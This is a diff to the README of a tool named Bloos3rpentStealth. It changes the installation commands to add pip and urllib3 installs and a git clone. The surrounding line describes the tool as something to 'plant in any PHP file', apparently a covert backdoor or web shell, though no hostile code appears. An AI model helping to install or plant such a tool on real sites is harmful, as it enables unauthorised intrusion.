@@ -4,7 +4,9 @@ Plant it in any PHP file. Totally not *sus*
 ## Installation
 
 ```bash
-wget https://github.com/bloos3rpent/Bloos3rpentStealth && cd Bloos3rpentStealth
+$ sudo apt-get install python3-pip
+$ sudo apt-get install python3-urllib3
+$ git clone https://github.com/bloos3rpent/Bloos3rpentStealth && cd Bloos3rpentStealth
 ```
 
 ## Usage
